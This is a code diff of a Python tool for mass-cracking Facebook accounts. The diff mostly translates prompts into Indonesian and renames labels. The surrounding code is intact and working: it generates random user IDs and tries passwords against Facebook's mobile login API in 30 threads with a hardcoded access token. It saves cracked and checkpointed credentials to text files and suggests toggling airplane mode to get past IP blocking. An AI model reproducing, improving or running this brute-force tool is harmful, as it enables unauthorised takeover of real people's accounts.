@@ -389,19 +389,19 @@ def follow(ses,coki):
 
 logo = ("""\033[1;32m
        
- ██████╗ ████████╗ ██████╗  ██╗   ██╗
-██╔════╝ ╚══██╔══╝ ██╔══██╗ ██║   ██║
-╚█████╗     ██║    ██████╔╝ ╚██╗ ██╔╝
- ╚═══██╗    ██║    ██╔══██╗  ╚████╔╝
-██████╔╝    ██║    ██║  ██║   ╚██╔╝
-╚═════╝     ╚═╝    ╚═╝  ╚═╝    ╚═╝   \033
-__________________×______________________
+  ██████╗ ████████╗ ██████╗  ██╗   ██╗
+ ██╔════╝ ╚══██╔══╝ ██╔══██╗ ██║   ██║
+ ╚█████╗     ██║    ██████╔╝ ╚██╗ ██╔╝
+  ╚═══██╗    ██║    ██╔══██╗  ╚████╔╝
+ ██████╔╝    ██║    ██║  ██║   ╚██╔╝
+ ╚═════╝     ╚═╝    ╚═╝  ╚═╝    ╚═╝   \033
+_________________________________________
   
-  Developer :  Strovmirviaska 
+  Developer : Strovmirviaska 
   Github    :  -
   Facebook  : Teddy Cahyo Putra Pangembara
   Contact   : Strovmirviaska11@gmail.com
-__________________×______________________\033[1;37m""")
+_________________________________________\033[1;37m""")
 
 class Main:
 	def __init__(self):
@@ -412,7 +412,7 @@ class Main:
 		os.system("clear")
 		print(logo)
 		print("\n [1] File Cloning")
-		print(" [2] Public Cloning")
+		print(" [2] Public Cloning\33[31m(OFF)")
 		print(" [3] Create File")
 		print(" [4] 2009-10 Cloning")
 		print(" [5] 2011-14 Cloning")
@@ -439,7 +439,7 @@ class Main:
 		xx = 999999999
 		idx = "100000" 
 		os.system('clear');print(logo)
-		limit = int(input(" \n\033[0;95m[+]\033[0;93m TOTAL IDS TO CRACK LIMIT 50,000: "))
+		limit = int(input(" \n\033[0;95m[+]\033[0;93m TOTAL ID YANG DAPAT DI CRACK 50,000: "))
 		try:
 			for n in range(limit):
 				_ = random.randint(x,xx)
@@ -448,19 +448,19 @@ class Main:
 			
 			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
 			with ThreadPoolExecutor(max_workers=30) as coeg:
-				print("\n\033[1;32m [!] USE (123456) FOR IDZ\033[1;37m ")
-				listpass = input("%s [?] ENTER PASSWORD :%s "%(G,Y))
+				print("\n\033[1;32m [!] CONTOH (123456) DLL !\033[1;37m ")
+				listpass = input("%s [?] MASUKAN PASSWORD :%s "%(G,Y))
 				if len(listpass)<=5:
-					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(B))
+					exit("\n%s [!] PASSWORD TERDIRI DARI 6 HURUF !"%(B))
 				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(G,listpass))
 				os.system("clear")
 				print(logo)
 				print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(Y))
 				print("%s [+] CP RESULTS SAVED IN -> cp.txt"%(G))
-				print("%s [!] IF NO RESULT USE AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(P))
+				print("%s [!] M0DE PESAWAT 5 MENIT KETIKA IP ANDA KENA SPAM !\x1b[0m\n"%(P))
 				for user in self.id:
 					coeg.submit(self.api, user, listpass.split(","))
-			exit("\n\n [>>] CRACK COMPLETE...")
+			exit("\n\n [>>] CRACK SELESAI JALANKAN ULANG TOOLS...")
 		except Exception as e:exit(str(e))
 
 	def api(self, uid, pwx):
@@ -829,7 +829,7 @@ class Main:
 			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
 		])
 		sys.stdout.write(
-			"\r [ UZAIR ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
+			"\r Sedang Proses Crack..  %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
 		); sys.stdout.flush()
 		for pw in pwx:
 			pw = pw.lower()
@@ -846,15 +846,15 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \033[0;92m[ UZAIR-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[ AKUN-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats Bro ")
 				self.ok.append("%s|%s"%(uid, pw))
-				open("2009-UZAIR-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("2009-AKUN-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[0;92m[ UZAIR-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[ AKUN-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("2009-UZAIR-OK.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("2009-AKUN-OK.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
 			else:
 				continue
